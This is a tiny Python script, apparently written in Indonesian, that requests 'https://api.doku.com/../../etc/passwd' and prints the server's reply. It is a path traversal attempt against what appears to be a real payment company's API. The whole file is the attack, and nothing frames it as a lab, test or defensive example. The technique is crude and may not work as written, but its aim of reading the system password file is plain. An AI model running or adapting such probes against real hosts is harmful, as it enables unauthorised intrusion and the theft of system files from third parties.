import requests

com = 'https://api.doku.com/../../etc/passwd'
try:
    response = requests.get(com)
    print('Succes', response)
    print('Hasil',response.text)
except Exception as a:
    print('Tes', a)
print('end')
